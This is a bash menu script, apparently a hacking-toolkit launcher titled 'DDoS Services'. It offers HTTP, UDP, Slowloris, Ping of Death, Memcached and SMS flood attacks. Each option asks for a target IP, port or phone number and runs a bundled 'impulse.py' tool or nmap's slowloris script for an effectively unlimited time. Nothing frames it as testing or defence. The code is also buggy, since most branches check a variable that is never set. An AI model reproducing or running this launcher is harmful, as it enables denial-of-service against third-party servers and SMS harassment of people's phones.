#!/bin/bash
#
#
#

# STARTING

clear
echo "Loading."
    sleep 1.0
    clear
echo "Loading.." 
    sleep 1.0
    clear
echo "Loading..." 
    sleep 1.0
    clear
echo "Loading...." 
    sleep 1.0
clear
    sleep 0.5
echo 
figlet -f big "DDoS Services" 
sleep 1.0
echo
echo "1.) HTTP-DDoS" 
    sleep 0.5
echo "2.) UDP-DDoS"
    sleep 0.5
echo "3.) SLOWLORIS-DDoS"
    sleep 0.5
echo "4.) PingOfDeath DDoS"
    sleep 0.5
echo "5.) Memcached-DDoS"
    sleep 0.5
echo "6.) SMS-DDoS"
    sleep 0.5
echo "7.) Slowloris-HTTP-Vulnereable check"
    sleep 0.5
echo "8.) Slowloris-HTTP-NMAP-DDoS"
    sleep 0.5
echo "9.) EXIT"
    sleep 0.5
echo "Enter youre choice:"
    read ddos;
if [ $ddos = 1 ]; then
    echo "Enter target IP:"
        read ip;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $ip:80 --method HTTP --time 999999999999999999 --threads 200
    cd ..
    cd ..
    echo "DDoS-Attack finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 2 ]; then 
    echo "Enter target IP:"
        read ip;
    echo "Enter target port:"
        read port;
        echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $ip:$port --method UDP --time 999999999999999999 --threads 200
    cd ..
    cd ..
    echo "DDoS-Attack finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 3 ]; then
    echo "Enter target IP:"
        read ip;
    echo "Enter target Port:"
        read port;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $ip:$port --method SLOWLORIS --time 999999999999999999 --threads 200
    cd ..
    cd ..
    echo "DDoS-Attack finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [$answer = 4]; then
    echo "Enter Target IP:"
        read ip;
    echo "Enter target Port:"
        read port;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $ip:$port --method POD --time 999999999999999999 --threads 200
    cd ..
    cd ..
    echo "DDoS-Attack finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 5 ]; then
    echo "Enter target IP:"
        read ip;
    echo "Enter target Port:"
        read port;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $ip:$port --method MEMCACHED --time 9999999999999999999 --threads 200
    cd ..
    cd ..
    echo "DDoS-Attack finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 6 ]; then
    echo "Enter target Phonenummber (+4...):"
        read tel;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    cd res/Impulse
    python3 impulse.py --target $tel --method SMS --time 99999999999999999999 --threads 200
    cd ..
    cd ..
    echo "SMS-DDoS finsihed!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 7 ]; then 
    echo "Enter target IP:"
        read ip;
    sudo nmap -Pn -sV $ip --script http-slowloris-check
    "Press 'ENTER' to continue..."  
        read
fi
if [ $answer = 8 ]; then
    echo "Enter target IP:"
        read ip;
    echo "After you starting this DDoS, you only can stop the attack by hitting 'ctrl + c' at the same time."
    echo "Hit 'ENTER' to continue"
    echo "Hit 'ctrl + c' to stop the Attack"
        read
    nmap -Pn -sV $ip --script http-sloris --max-parallelism 400 -d
    echo "SLOWLORIS HTTP-DDoS finished!"
    echo "Press 'ENTER' to continue..."
        read
fi
if [ $answer = 9 ]; then
    cd ..
    ./BashScripting.sh
fi
./menu6.sh
/bin/sh